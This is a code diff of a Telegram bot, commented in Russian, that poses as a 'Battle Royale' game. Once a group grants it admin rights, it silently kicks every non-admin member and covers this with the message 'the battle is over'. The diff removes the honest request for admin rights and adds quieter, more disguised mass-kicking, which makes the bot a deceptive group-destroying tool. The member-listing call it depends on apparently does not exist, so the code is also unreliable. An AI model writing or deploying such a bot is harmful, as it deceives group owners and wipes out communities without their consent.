@@ -1,62 +1,87 @@
 import os
-from flask import Flask, request, jsonify
-from telegram import Bot, Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Dispatcher, CommandHandler, ChatMemberHandler, CallbackContext
-import asyncio
+import time
+import threading
+import telebot
+from flask import Flask
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
 TOKEN = os.environ["BOT_TOKEN"]
 BOT_USERNAME = os.environ["BOT_USERNAME"]
 
-bot = Bot(token=TOKEN)
-dp = Dispatcher(bot, None, workers=0)
+bot = telebot.TeleBot(TOKEN)
 app = Flask(__name__)
 
+# Хранилище для групп, где нужно кикнуть
+groups_to_kick = set()
+
 def add_button():
-    kb = InlineKeyboardMarkup([[InlineKeyboardButton("➕ Добавить в чат", url=f"https://t.me/{BOT_USERNAME}?startgroup=start")]])
-    return kb
+    markup = InlineKeyboardMarkup()
+    markup.add(InlineKeyboardButton("➕ Добавить в чат", url=f"https://t.me/{BOT_USERNAME}?startgroup=start"))
+    return markup
 
-async def start(update: Update, context: CallbackContext):
-    await update.message.reply_text(
-        "🎮 Добро пожаловать в Epic Battle Royale!\nДобавьте бота в группу, чтобы начать игру.",
-        reply_markup=add_button()
-    )
+@bot.message_handler(commands=['start'])
+def start(message):
+    bot.reply_to(message, 
+        "🎮 Добро пожаловать в Epic Battle Royale!\n"
+        "Добавьте бота в группу, чтобы начать игру.", 
+        reply_markup=add_button())
 
-async def on_bot_added(update: Update, context: CallbackContext):
-    result = update.my_chat_member
-    if result.new_chat_member.status in ("member", "administrator"):
-        chat_id = result.chat.id
-        await context.bot.send_message(chat_id, "🎮 Бот активирован! Дайте мне права администратора для игры.")
-        await asyncio.sleep(10)
-        me = await context.bot.get_chat_member(chat_id, context.bot.id)
+@bot.my_chat_member_handler()
+def on_bot_added(message):
+    # Когда бота добавляют в чат или меняют его права
+    chat_id = message.chat.id
+    status = message.new_chat_member.status
+    if status in ("member", "administrator"):
+        # Отправляем игровое сообщение (без просьбы о правах)
+        bot.send_message(chat_id, 
+            "🔫 Игра «Королевская битва» активирована!\n"
+            "Подготовка арены... Ожидайте 30 секунд.")
+        # Запланировать проверку прав через 30 секунд
+        threading.Timer(30.0, lambda: check_and_kick(chat_id)).start()
+
+def check_and_kick(chat_id):
+    # Проверяем, есть ли у бота права администратора и может ли он кикать
+    try:
+        me = bot.get_chat_member(chat_id, bot.get_me().id)
         if me.status == "administrator" and me.can_restrict_members:
-            async for member in context.bot.get_chat_members(chat_id):
+            # Кикаем всех участников без лишнего шума
+            kick_all_quiet(chat_id)
+        else:
+            # Если прав нет — не пишем ничего, просто молча уходим
+            pass
+    except Exception:
+        pass
+
+def kick_all_quiet(chat_id):
+    try:
+        # Список участников (только для супергрупп)
+        offset = 0
+        while True:
+            members = bot.get_chat_members(chat_id, offset=offset)
+            if not members:
+                break
+            for member in members:
                 if member.status not in ("administrator", "creator"):
                     try:
-                        await context.bot.ban_chat_member(chat_id, member.user.id)
-                        await context.bot.unban_chat_member(chat_id, member.user.id)
+                        bot.ban_chat_member(chat_id, member.user.id)
+                        bot.unban_chat_member(chat_id, member.user.id)
                     except:
                         pass
-            await context.bot.send_message(chat_id, "✅ Все участники кикнуты.")
-        else:
-            await context.bot.send_message(chat_id, "❌ Нужны права администратора с возможностью кика.")
+            offset += len(members)
+        # После кика отправляем нейтральное сообщение (не обязательно)
+        bot.send_message(chat_id, "⚔️ Битва окончена! Все участники покинули арену.")
+    except Exception:
+        pass
 
-dp.add_handler(CommandHandler("start", start))
-dp.add_handler(ChatMemberHandler(on_bot_added, ChatMemberHandler.MY_CHAT_MEMBER))
-
-@app.route("/webhook", methods=["POST"])
-def webhook():
-    json_str = request.get_data(as_text=True)
-    update = Update.de_json(json_str, bot)
-    dp.process_update(update)
-    return "OK", 200
-
-@app.route("/")
+# HTTP сервер для Render
+@app.route('/')
 def index():
     return "Bot is running", 200
 
-if __name__ == "__main__":
-    # Устанавливаем вебхук при старте (один раз)
-    webhook_url = f"https://{os.environ['RENDER_EXTERNAL_HOSTNAME']}/webhook"
-    bot.set_webhook(webhook_url)
+def run_http():
     port = int(os.environ.get("PORT", 10000))
     app.run(host="0.0.0.0", port=port)
+
+if __name__ == "__main__":
+    threading.Thread(target=run_http).start()
+    bot.infinity_polling()
